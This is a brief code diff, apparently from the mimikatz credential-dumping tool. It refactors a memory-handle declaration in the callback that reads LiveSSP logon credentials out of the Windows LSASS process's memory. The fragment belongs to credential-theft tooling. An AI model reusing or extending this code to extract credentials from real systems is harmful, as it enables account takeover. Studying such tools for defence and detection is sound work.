@@ -30,8 +30,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURIT
 {
 	KIWI_LIVESSP_LIST_ENTRY credentials;
 	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	
 	if(kuhl_m_sekurlsa_livessp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_livessp_package.Module, LiveReferences, ARRAYSIZE(LiveReferences), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL, NULL))
 	{
